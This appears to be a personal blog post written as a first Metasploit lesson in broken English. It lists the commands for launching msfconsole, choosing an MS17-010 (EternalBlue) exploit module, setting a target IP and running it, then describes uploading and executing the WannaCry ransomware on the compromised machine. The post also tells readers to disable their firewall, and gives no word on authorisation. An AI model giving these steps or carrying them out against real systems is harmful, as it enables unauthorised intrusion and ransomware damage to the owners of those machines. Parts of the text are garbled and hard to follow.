---
title: "kali the first lesson metasploit"
date: 2026-03-28
categories: [未分类]
slug: hello-world
wordpress_id: 1
---

## Turn on metasploit-framework(meta exploit)

official documents:[Home | Metasploit Documentation Penetration Testing Software, Pen Testing Security](<https://docs.metasploit.com/>) (https://docs.metasploit.com/) DOWNLOAD [Directory Tree](<https://windows.metasploit.com/>) https://windows.metasploit.com/ [Download Metasploit: World's Most Used Penetration Testing Tool | Metasploit](<https://www.metasploit.com/download>) https://www.metasploit.com/download [![](/images/2026/03/6-150x150.png)](</images/2026/03/6.png>)              

## First1:

Turn off the firewall download packet [![](/images/2026/03/8-150x150.png)](</images/2026/03/8.png>)  

## 

     

## First2:

add environment directory at terminal that run as administrator 
    
    
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /t REG_EXPAND_SZ /d "%PATH%;C:\metasploit-framework\bin" /f[![](/images/2026/03/9-150x150.png)](</images/2026/03/9.png>)

       

## First3:

run metasploit framework 
    
    
    msfconsole 

[![](/images/2026/03/10-150x150.png)](</images/2026/03/10.png>)        

## 

## First4:

use msf17_010(EternBlue:永恒之蓝）(wannaacry) first:search msf17_010 target can be sucessfully attacketed 
    
    
    search msf17_010


[![](/images/2026/03/11-150x150.png)](</images/2026/03/11.png>)         then: eg target system is windows 7 
    
    
    use 2

later look at required conditions 
    
    
    options

[![](/images/2026/03/12-150x150.png)](</images/2026/03/12.png>)           find only need target IP then set target ip 
    
    
    set rhosts 192.168.41.184

then carry out on attack 
    
    
    run thereof control target computers if want can seed hello

[![](/images/2026/03/13-150x150.png)](</images/2026/03/13.png>)       [![](/images/2026/03/14-150x150.png)](</images/2026/03/14.png>)           upload + target path send ransomware excute run virus wannacry [![](/images/2026/03/15-150x150.jpg)](</images/2026/03/15.jpg>)           [wannakey:Wannacry in-memory key recovery - AtomGit | GitCode](<https://gitcode.com/gh_mirrors/wa/wannakey>) https://gitcode.com/gh_mirrors/wa/wannakey
